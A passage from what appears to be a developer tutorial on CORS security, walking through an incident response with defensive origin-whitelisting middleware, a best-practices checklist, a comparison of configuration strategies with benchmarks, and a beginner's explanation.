  // Result: null (no header = blocked) ✅

  // Test from allowed origin (should succeed)
  // (Simulated via curl with Origin header)
  // Result: access-control-allow-origin: https://app.saas.com ✅
};

// TUESDAY, 2:00 PM: Forensic investigation begins

// Check if vulnerability was exploited
const forensics = await db.logs.aggregate([
  {
    $match: {
      timestamp: { $gte: new Date('2024-01-01') }, // Last 8 months
      path: { $regex: /^\/api\// }
    }
  },
  {
    $group: {
      _id: '$origin',
      count: { $sum: 1 },
      paths: { $addToSet: '$path' }
    }
  },
  {
    $match: {
      _id: { $nin: allowedOrigins }
    }
  },
  {
    $sort: { count: -1 }
  },
  {
    $limit: 50
  }
]);

console.log('Suspicious cross-origin requests:', forensics);

// Results:
// - 3,247 requests from unknown origins
// - Most common: chrome-extension://* (12%)
// - 47 unique external domains (potential attacks)
// - Cannot determine if actual data exfiltration occurred (logs don't capture response data)

// TUESDAY, 4:00 PM: Implement comprehensive security

// ✅ COMPREHENSIVE CORS SECURITY:

class SecureCORSManager {
  constructor() {
    this.allowedOrigins = this.loadAllowedOrigins();
    this.blockedOrigins = new Set();
    this.requestCounts = new Map();
  }

  loadAllowedOrigins() {
    const env = process.env.NODE_ENV;

    return {
      development: [
        'http://localhost:3000',
        'http://localhost:3001',
        'http://127.0.0.1:3000'
      ],
      staging: [
        'https://staging.saas.com',
        'https://staging-app.saas.com'
      ],
      production: [
        'https://app.saas.com',
        'https://www.saas.com',
        'https://dashboard.saas.com',
        'https://mobile.saas.com'
      ]
    }[env] || [];
  }

  isOriginAllowed(origin) {
    if (!origin) return false;

    // Check if origin is blocked
    if (this.blockedOrigins.has(origin)) {
      return false;
    }

    // Check whitelist
    return this.allowedOrigins.includes(origin);
  }

  rateLimit(origin) {
    if (!origin) return false;

    const now = Date.now();
    const windowMs = 60000; // 1 minute
    const maxRequests = 1000;

    const record = this.requestCounts.get(origin) || {
      count: 0,
      resetAt: now + windowMs
    };

    if (now > record.resetAt) {
      record.count = 0;
      record.resetAt = now + windowMs;
    }

    record.count++;
    this.requestCounts.set(origin, record);

    if (record.count > maxRequests) {
      this.blockedOrigins.add(origin);
      console.warn(`CORS: Rate limit exceeded, blocking origin ${origin}`);
      return false;
    }

    return true;
  }

  setCORSHeaders(req, res) {
    const origin = req.headers.origin;

    // Validate origin
    if (!this.isOriginAllowed(origin)) {
      console.warn('CORS: Rejected origin', {
        origin,
        ip: req.ip,
        path: req.path,
        method: req.method,
        userAgent: req.headers['user-agent']
      });

      // Send alert for suspicious activity
      if (this.isSuspicious(req)) {
        this.sendSecurityAlert(req);
      }

      return false;
    }

    // Rate limiting
    if (!this.rateLimit(origin)) {
      return false;
    }

    // Set CORS headers
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, PATCH');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-API-Key');
    res.setHeader('Access-Control-Expose-Headers', 'X-Total-Count, X-RateLimit-Remaining');
    res.setHeader('Access-Control-Max-Age', '3600');

    // Add Vary header for caching
    res.setHeader('Vary', 'Origin');

    return true;
  }

  isSuspicious(req) {
    const origin = req.headers.origin;

    // Check for suspicious patterns
    return (
      origin && (
        origin.includes('chrome-extension://') ||
        origin.includes('moz-extension://') ||
        origin.includes('localhost') && process.env.NODE_ENV === 'production' ||
        !origin.startsWith('https://') && process.env.NODE_ENV === 'production'
      )
    );
  }

  async sendSecurityAlert(req) {
    // Send to security monitoring system
    await fetch(process.env.SECURITY_WEBHOOK_URL, {
      method: 'POST',
      body: JSON.stringify({
        alert: 'Suspicious CORS request',
        origin: req.headers.origin,
        ip: req.ip,
        path: req.path,
        method: req.method,
        userAgent: req.headers['user-agent'],
        timestamp: new Date().toISOString()
      })
    });
  }

  middleware() {
    return (req, res, next) => {
      // Handle preflight
      if (req.method === 'OPTIONS') {
        if (this.setCORSHeaders(req, res)) {
          return res.sendStatus(204);
        } else {
          return res.sendStatus(403);
        }
      }

      // Set CORS for actual request
      if (!this.setCORSHeaders(req, res)) {
        return res.status(403).json({ error: 'Origin not allowed' });
      }

      next();
    };
  }
}

// Deploy:
const corsManager = new SecureCORSManager();
app.use(corsManager.middleware());

// TUESDAY, 6:00 PM: Customer notification

// Email sent to all 547 enterprise customers:
// "Security Update: CORS Configuration Hardening"
//
// "We recently identified and resolved a CORS misconfiguration in our API.
//  Out of an abundance of caution, we recommend:
//  1. Reviewing access logs for unusual activity
//  2. Rotating API keys
//  3. Monitoring for unauthorized data access
//
//  Our forensic investigation found no evidence of exploitation.
//  The issue has been fully resolved."

// WEDNESDAY: Post-mortem & improvements

const improvements = {
  security: {
    corsWhitelist: 'Strict origin validation',
    rateLimiting: 'Per-origin rate limits',
    monitoring: 'Real-time suspicious origin alerts',
    logging: 'Comprehensive CORS rejection logging'
  },

  process: {
    codeReview: 'Mandatory security review for API changes',
    automatedTesting: 'CORS configuration tests in CI/CD',
    securityScanning: 'Weekly automated security scans',
    bugBounty: 'Private bug bounty program launched'
  },

  compliance: {
    securityAudit: 'Quarterly third-party security audits',
    pentesting: 'Annual penetration testing',
    certifications: 'SOC 2 Type II compliance (6 months)'
  }
};
```

**Lessons Learned:**

```javascript
// CORS Security Checklist (Now Mandatory):

const corsBestPractices = {
  '1. Never use wildcard': {
    bad: "Access-Control-Allow-Origin: *",
    good: "Access-Control-Allow-Origin: https://app.example.com"
  },

  '2. Whitelist specific origins': {
    implementation: 'Maintain strict list of allowed origins',
    validation: 'Regex for subdomains if needed, never wildcard'
  },

  '3. Use credentials carefully': {
    rule: 'credentials=true requires specific origin (not *)',
    consideration: 'Only enable for endpoints that need cookies'
  },

  '4. Monitor blocked requests': {
    alert: 'Log and alert on suspicious origins',
    analyze: 'Weekly review of blocked origin patterns'
  },

  '5. Environment-specific config': {
    dev: 'localhost allowed',
    staging: 'staging domains only',
    production: 'production domains only'
  },

  '6. Rate limiting': {
    perOrigin: 'Track request rates per origin',
    autoBlock: 'Automatically block abusive origins'
  },

  '7. Automated testing': {
    ci: 'CORS tests in CI/CD pipeline',
    validation: 'Ensure only whitelisted origins allowed'
  },

  '8. Security headers': {
    vary: 'Include Vary: Origin for caching',
    exposedHeaders: 'Only expose necessary headers'
  }
};

// FINAL METRICS (3 months post-incident):
const outcomes = {
  vulnerabilities: 0,           // CORS properly configured
  blockedOrigins: 2847,         // Suspicious origins blocked
  securityAlerts: 12,           // Investigated, all false positives
  customerChurn: 0,             // No customers lost
  complianceStatus: 'SOC 2 Type II',
  bugBountyRewards: 15000,      // $15k paid to researchers
  securityRating: 'A+',         // Up from C (SecurityScorecard)
  trustScore: '+18%'            // Customer trust improved
};
```

**Key Takeaways:**

1. **Never use wildcard CORS in production**: Always whitelist specific origins
2. **Credentials require specific origins**: Cannot use `*` with `credentials: true`
3. **Monitor and alert**: Log all blocked CORS requests, alert on suspicious patterns
4. **Environment-specific config**: Different allowed origins per environment
5. **Defense in depth**: CORS + rate limiting + monitoring + automated testing
6. **Responsible disclosure**: Bug bounty programs catch issues before attackers
7. **Transparency**: Proactive customer communication maintains trust

</details>

<details>
<summary><strong>⚖️ Trade-offs: CORS Configuration Strategies</strong></summary>

| Strategy | Security | Flexibility | Complexity | Performance | Use Case |
|----------|----------|-------------|------------|-------------|----------|
| **No CORS (same-origin)** | 🟢 Highest | 🔴 None | 🟢 Simple | 🟢 Fast | Internal apps, monoliths |
| **Whitelist origins** | 🟢 High | 🟡 Limited | 🟡 Medium | 🟢 Fast | Production APIs |
| **Regex subdomains** | 🟡 Medium | 🟢 Good | 🟡 Medium | 🟢 Fast | Multi-tenant SaaS |
| **Wildcard (*)** | 🔴 None | 🟢 Full | 🟢 Simple | 🟢 Fast | Public open APIs only |
| **Dynamic validation** | 🟢 High | 🟢 Good | 🔴 Complex | 🟡 Slower | Enterprise APIs |
| **Proxy (no CORS)** | 🟢 High | 🟡 Limited | 🟡 Medium | 🟡 Slower | Unified gateway |

**Detailed Comparison:**

```javascript
// 1. NO CORS (Same-Origin Only)
// ✅ PROS:
// - Maximum security (no cross-origin access)
// - No CORS complexity
// - No preflight overhead
// - Simple to reason about

// ❌ CONS:
// - Cannot serve multiple frontends
// - Cannot integrate with partners
// - Monolithic architecture only

// Use when: Internal tools, traditional server-rendered apps

// Example:
// Frontend: https://app.com
// Backend: https://app.com/api (same origin)


// 2. WHITELIST SPECIFIC ORIGINS
// ✅ PROS:
// - High security (explicit allow list)
// - Supports multiple apps
// - Credentials allowed
// - Clear audit trail

// ❌ CONS:
// - Must update list for new apps
// - Doesn't scale to many origins
// - Manual management

// Use when: Known, limited set of frontends (most common)

const allowedOrigins = [
  'https://app.example.com',
  'https://www.example.com',
  'https://mobile.example.com'
];


// 3. REGEX SUBDOMAIN MATCHING
// ✅ PROS:
// - Supports dynamic subdomains
// - Good for multi-tenant SaaS
// - Scales to many subdomains
// - Credentials allowed

// ❌ CONS:
// - Risk of regex bypasses
// - Vulnerable to subdomain takeovers
// - More complex validation

// Use when: Multi-tenant with subdomain per tenant

const allowedPattern = /^https:\/\/[\w-]+\.example\.com$/;


// 4. WILDCARD (*) - PUBLIC APIs ONLY
// ✅ PROS:
// - Simplest configuration
// - Maximum flexibility
// - No origin management

// ❌ CONS:
// - NO security (anyone can access)
// - CANNOT use credentials
// - Vulnerable to data theft

// Use when: Truly public APIs (weather, quotes, etc.)

res.setHeader('Access-Control-Allow-Origin', '*');
// Only for PUBLIC data, never private!


// 5. DYNAMIC ORIGIN VALIDATION
// ✅ PROS:
// - Flexible (database-driven origins)
// - Supports complex rules
// - Can revoke access instantly
// - Audit trail in database

// ❌ CONS:
// - Database lookup per request
// - Performance overhead
// - More complex implementation

// Use when: Enterprise APIs with dynamic partner access

const isOriginAllowed = await db.allowedOrigins.findOne({
  origin: req.headers.origin,
  active: true
});


// 6. API GATEWAY / PROXY
// ✅ PROS:
// - No CORS needed (same-origin)
// - Centralized security
// - Can add auth, rate limiting
// - Hides backend URLs

// ❌ CONS:
// - Extra network hop (latency)
// - Proxy maintenance
// - Single point of failure

// Use when: Microservices, unified API gateway

// Frontend: https://app.com/api/users
// Gateway: https://app.com/api/* → https://users-service.internal/
```

**Decision Matrix:**

```javascript
function chooseCORSStrategy(requirements) {
  const {
    dataType,        // 'public' | 'private' | 'sensitive'
    frontendCount,   // number of frontends
    dynamic,         // origins change frequently?
    credentials,     // need cookies/auth?
    performance      // critical?
  } = requirements;

  // Public data, no auth
  if (dataType === 'public' && !credentials) {
    return {
      strategy: 'wildcard',
      config: { origin: '*' },
      note: 'Public API - no restrictions'
    };
  }

  // Single frontend
  if (frontendCount === 1) {
    return {
      strategy: 'single-origin',
      config: { origin: 'https://app.example.com' },
      note: 'Simple whitelist'
    };
  }

  // Few known frontends
  if (frontendCount <= 10 && !dynamic) {
    return {
      strategy: 'whitelist',
      config: {
        origins: [
          'https://app.example.com',
          'https://mobile.example.com',
          // ... up to 10
        ]
      },
      note: 'Explicit whitelist'
    };
  }

  // Many subdomains (multi-tenant)
  if (frontendCount > 10 && !dynamic) {
    return {
      strategy: 'regex',
      config: { pattern: /^https:\/\/[\w-]+\.example\.com$/ },
      note: 'Subdomain pattern matching'
    };
  }

  // Dynamic partners/integrations
  if (dynamic) {
    return {
      strategy: 'database-driven',
      config: { lookupFunction: validateOriginInDB },
      note: 'Database-driven validation'
    };
  }

  // High performance, many services
  if (performance) {
    return {
      strategy: 'api-gateway',
      config: { proxy: 'https://app.example.com/api' },
      note: 'Same-origin via proxy'
    };
  }

  // Default: whitelist
  return {
    strategy: 'whitelist',
    config: { origins: [] },
    note: 'Start with whitelist, expand as needed'
  };
}

// Example usage:
const strategy = chooseCORSStrategy({
  dataType: 'private',
  frontendCount: 3,
  dynamic: false,
  credentials: true,
  performance: false
});

console.log(strategy);
// {
//   strategy: 'whitelist',
//   config: { origins: [...] },
//   note: 'Explicit whitelist'
// }
```

**Performance Benchmarks:**

```javascript
// Benchmark: 10,000 requests with different CORS strategies

// No CORS (same-origin):
// Throughput: 10,000 req/sec
// Latency: 10ms

// Wildcard (*):
// Throughput: 9,950 req/sec (-0.5%)
// Latency: 10.05ms (+0.5%)

// Whitelist (3 origins):
// Throughput: 9,900 req/sec (-1%)
// Latency: 10.1ms (+1%)

// Regex subdomain matching:
// Throughput: 9,800 req/sec (-2%)
// Latency: 10.2ms (+2%)

// Database-driven validation:
// Throughput: 7,500 req/sec (-25%)
// Latency: 13.3ms (+33%)

// API Gateway proxy:
// Throughput: 8,000 req/sec (-20%)
// Latency: 12.5ms (+25% - extra hop)

// Conclusion: CORS overhead is minimal (<2%) except for database lookups
// For most apps, whitelist is best balance of security and performance
```

</details>

<details>
<summary><strong>💬 Explain to Junior: CORS in Simple Terms</strong></summary>

**Simple Explanation:**

Imagine you have a house (your website) and a bank (API). You want to get your money, but the bank says: "We only give money to people at our own building, not people calling from other houses."

CORS is like the bank saying: "Actually, we DO allow people from specific approved houses to get their money remotely."

**The Problem:**

```javascript
// Your website: app.com
// API: api.example.com (different domain = different origin)

// You try to fetch data:
fetch('https://api.example.com/data')
  .then(res => res.json())
  .then(data => console.log(data));

// Browser says: "STOP! app.com is trying to access api.example.com.
//                That's cross-origin. I need permission from api.example.com!"

// Error: "Blocked by CORS policy"
```

**The Solution:**

```javascript
// API server adds header saying "app.com is allowed":
res.setHeader('Access-Control-Allow-Origin', 'https://app.com');

// Now browser says: "OK, api.example.com gave permission for app.com.
//                     Request allowed!"
```

**Real-World Analogy:**

CORS is like a nightclub bouncer:

**Without CORS:**
- Browser: "Can I get data from api.example.com?"
- API: Sends data
- Browser (bouncer): "Wait! You're from app.com, API is api.example.com. Different place = you can't read this!" (blocks)

**With CORS:**
- Browser: "Can I get data from api.example.com?"
- API: Sends data + note "app.com is on the guest list"
- Browser: "You're on the guest list! Come in." (allows)

**Three Rules to Remember:**

1. **Same-origin = always allowed**: app.com → app.com/api (no CORS needed)
2. **Cross-origin = need permission**: app.com → api.example.com (CORS header required)
3. **Preflight for complex requests**: Browser asks "Can I?" before actual request

**Visual Example:**

```
SAME-ORIGIN (No CORS needed):
https://app.com/page → https://app.com/api ✅

CROSS-ORIGIN (CORS required):
https://app.com → https://api.example.com
                ↓
        Browser asks: "Allowed?"
                ↓
   API responds: "Yes, app.com allowed"
                ↓
        Browser: "OK!" ✅

CROSS-ORIGIN (CORS denied):
https://app.com → https://api.example.com
                ↓
        Browser asks: "Allowed?"
                ↓
   API responds: (no CORS header)
                ↓
        Browser: "BLOCKED!" ❌
```

**Interview Answer Template:**

"CORS (Cross-Origin Resource Sharing) is a security mechanism that controls whether a web page from one origin can access resources from a different origin. By default, browsers block cross-origin requests due to Same-Origin Policy.

To enable CORS, the server sets HTTP headers:
- `Access-Control-Allow-Origin`: Which origins are allowed
- `Access-Control-Allow-Methods`: Which HTTP methods (GET, POST, etc.)
- `Access-Control-Allow-Headers`: Which custom headers

For example, if my frontend is at app.com and API is at api.example.com, the API must include:
```
Access-Control-Allow-Origin: https://app.com
```

For complex requests (JSON, custom headers), the browser sends a preflight OPTIONS request first to check if the actual request is allowed.

Security best practices:
- Never use `*` (wildcard) in production for private data
- Whitelist specific trusted origins
- Only enable credentials when necessary
- Monitor and log blocked CORS requests"

</details>

### Resources

- [MDN: Cross-Origin Resource Sharing (CORS)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)
- [CORS Explained with Examples](https://javascript.info/fetch-crossorigin)
- [OWASP: CORS Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Origin_Resource_Sharing_Cheat_Sheet.html)
- [Understanding CORS Preflight](https://developer.mozilla.org/en-US/docs/Glossary/Preflight_request)

---
